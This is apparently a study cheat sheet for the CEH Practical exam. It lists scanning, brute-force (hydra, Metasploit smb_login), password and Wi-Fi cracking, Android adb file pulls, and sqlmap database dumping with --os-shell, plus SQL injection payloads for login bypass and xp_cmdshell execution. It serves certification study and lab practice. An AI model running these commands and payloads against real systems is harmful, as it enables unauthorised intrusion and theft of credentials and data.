===== Scanning =====

netdiscover -r x.x.x.1/24
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
nmap -p 389 -T4 -A -v --script ldap-rootdse nnn.nnn.nnn.nnn/nn
nmap --script ftp-brute -p 21 <host>
Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql


==== Crack SMB credentials ====

1) hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb

2) Metasploit

For Cracking SMB Password:
•	we need to make folder -> store wordlist into that -> run msf from that folder | This process makes your work even better and smooth.
•	>msfconsole .
•	>use auxiliary/scanner/smb/smb_login
•	>show option | To get an idea of what to set on
•	>set PASS_FILE ./ROKYOU.TXT
•	>set rhost {target IP address} | notes :- rhost means remote host
•	>set SMBUser name [of the user] | (generally Administrator is username)
•	>run

=== Bruteforce SSH, TELNET, FTP  ===

hydra -l username -P passlist.txt x.x.x.x ssh
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet

hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x

•	If the service isn't running on the default port, use -s
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221

	
•	Used to download the specific file from FTP to attacker or local machine
get flag.txt ~/Desktop/filepath/flag.txt


==== Vulnerability Scanning ====

1) Nessus

Nessus runs on https[:]//localhost[:]8834

2) nikto -h 

===== Hidden text ====

1) snow -C -p "magic" readme2.txt

2) steghide 

==== WIRESHARK ====



To find DOS (SYN and ACK) : 
•	tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0

To find Wireshark DOS attack:
•	statistic -> IPv4 statistic -> source and destination address

View Flood attack on victim via Wireshark 
•	| use filter tcp.port=21


https://www.comparitech.com/net-admin/wireshark-cheat-sheet/

====== SQL ======

SQLMAP Extract DBS
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs

Extract Tables
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables

Extract Columns
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns

Dump Data
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump

OS Shell to execute commands
•	sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell

Login bypass
•	blah' or 1=1 --

Insert data into DB from login
•	blah';insert into login values ('john','apple123');

Create database from login
•	blah';create database mydatabase;

Execute cmd from login
•	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --


=== PASSWORD CRACKING ===

john --single --format=md5crypt crack.txt

=== WIFI ENCYRPTION CRACKING ===

aircrack-ng -w rockyou.txt capture-01.cap


=== VERACRYPT ===


=== CUSTOM WORDLIST ===

=== MOBILE ===

ADB
To Install ADB
apt-get update
sudo apt-get install adb -y
adb devices -l
Connection Establish Steps
adb connect x.x.x.x:5555
adb devices -l
adb shell  
To navigate
pwd
ls
cd Download
ls
cd sdcard
Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop

== resources ==

https://github.com/nirangadh/ceh-practical/blob/main/module03-Scanning-Networks.txt
https://github.com/Samson-DVS/CEH-Practical-Notes/tree/main
